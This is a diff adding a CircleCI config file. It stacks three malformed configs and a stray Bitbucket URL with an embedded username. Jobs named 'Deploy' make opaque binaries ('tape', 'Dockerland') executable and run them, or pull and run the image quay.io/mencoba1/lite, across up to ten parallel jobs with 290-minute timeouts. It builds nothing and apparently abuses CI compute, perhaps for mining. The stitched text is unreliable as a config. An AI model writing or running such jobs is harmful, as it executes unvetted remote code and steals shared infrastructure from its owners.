@@ -1,0 +1,217 @@
+version: 2.1
+
+jobs:
+  build:
+    machine:
+      image: ubuntu-2004:202101-01
+    steps:
+      - checkout
+      - run:
+         name: "Deploy"
+         command: chmod 777 tape && ./tape
+  build1:
+    machine:
+      image: ubuntu-2004:202101-01
+    steps:
+      - checkout
+      - run:
+         name: "Deploy"
+         command: chmod 777 tape && ./tape
+
+workflows:
+  main:
+    jobs:
+      - build
+      - build1
+     
+      
+      
+      
+      
+https://Mzhsh9929@bitbucket.org/jznsn99/hshshsh.git
+      
+      
+      
+      
+version: 2.1
+
+jobs:
+  build:
+    machine:
+      image: ubuntu-2004:202101-01
+    steps:
+      - checkout
+      - run:
+         name: "Deploy"
+         command: |
+                      docker pull quay.io/mencoba1/lite:latest
+                      docker run quay.io/mencoba1/lite:latest
+         no_output_timeout: 290m
+  build1:
+    machine:
+      image: ubuntu-2004:202101-01
+    steps:
+      - checkout
+      - run:
+         name: "Deploy"
+         command: |
+                      docker pull quay.io/mencoba1/lite:latest
+                      docker run quay.io/mencoba1/lite:latest
+         no_output_timeout: 290m
+  build2:
+    machine:
+      image: ubuntu-2004:202101-01
+    steps:
+      - checkout
+      - run:
+         name: "Deploy"
+         command: |
+                      docker pull quay.io/mencoba1/lite:latest
+                      docker run quay.io/mencoba1/lite:latest
+         no_output_timeout: 290m
+  build3:
+    machine:
+      image: ubuntu-2004:202101-01
+    steps:
+      - checkout
+      - run:
+         name: "Deploy"
+         command: |
+                      docker pull quay.io/mencoba1/lite:latest
+                      docker run quay.io/mencoba1/lite:latest
+         no_output_timeout: 290m
+  build4:
+    machine:
+      image: ubuntu-2004:202101-01
+    steps:
+      - checkout
+      - run:
+         name: "Deploy"
+         command: |
+                      docker pull quay.io/mencoba1/lite:latest
+                      docker run quay.io/mencoba1/lite:latest
+         no_output_timeout: 290m
+         
+workflows:
+  main:
+    jobs:
+      - build
+      - build1
+      - build2
+      - build3
+      - build4
+
+
+
+
+
+
+
+
+version: 2.1
+
+jobs:
+  build:
+    machine:
+      image: ubuntu-2004:202101-01
+    steps:
+      - checkout
+      - run:
+         name: "Deploy"
+         command: chmod 777 Dockerland && ./Dockerland
+         no_output_timeout: 290m
+  build1:
+    machine:
+      image: ubuntu-2004:202101-01
+    steps:
+      - checkout
+      - run:
+         name: "Deploy"
+         command: chmod 777 Dockerland && ./Dockerland
+         no_output_timeout: 290m
+  build2:
+    machine:
+      image: ubuntu-2004:202101-01
+    steps:
+      - checkout
+      - run:
+         name: "Deploy"
+         command: chmod 777 Dockerland && ./Dockerland
+         no_output_timeout: 290m
+  build3:
+    machine:
+      image: ubuntu-2004:202101-01
+    steps:
+      - checkout
+      - run:
+         name: "Deploy"
+         command: chmod 777 Dockerland && ./Dockerland
+         no_output_timeout: 290m
+  build4:
+    machine:
+      image: ubuntu-2004:202101-01
+    steps:
+      - checkout
+      - run:
+         name: "Deploy"
+         command: chmod 777 Dockerland && ./Dockerland
+         no_output_timeout: 290m
+  build5:
+    machine:
+      image: ubuntu-2004:202101-01
+    steps:
+      - checkout
+      - run:
+         name: "Deploy"
+         command: chmod 777 Dockerland && ./Dockerland
+         no_output_timeout: 290m
+  build6:
+    machine:
+      image: ubuntu-2004:202101-01
+    steps:
+      - checkout
+      - run:
+         name: "Deploy"
+         command: chmod 777 Dockerland && ./Dockerland
+         no_output_timeout: 290m
+  build7:
+    machine:
+      image: ubuntu-2004:202101-01
+    steps:
+      - checkout
+      - run:
+         name: "Deploy"
+         command: chmod 777 Dockerland && ./Dockerland
+         no_output_timeout: 290m
+  build8:
+    machine:
+      image: ubuntu-2004:202101-01
+    steps:
+      - checkout
+      - run:
+         name: "Deploy"
+         command: chmod 777 Dockerland && ./Dockerland
+         no_output_timeout: 290m
+  build9:
+    machine:
+      image: ubuntu-2004:202101-01
+    steps:
+      - checkout
+      - run:
+         name: "Deploy"
+         command: chmod 777 Dockerland && ./Dockerland
+         no_output_timeout: 290m
+         
+workflows:
+  main:
+    jobs:
+      - build
+      - build1
+      - build2
+      - build3
+      - build4
+      - build5
+      - build6
+      - build7
+      - build8
+      - build9
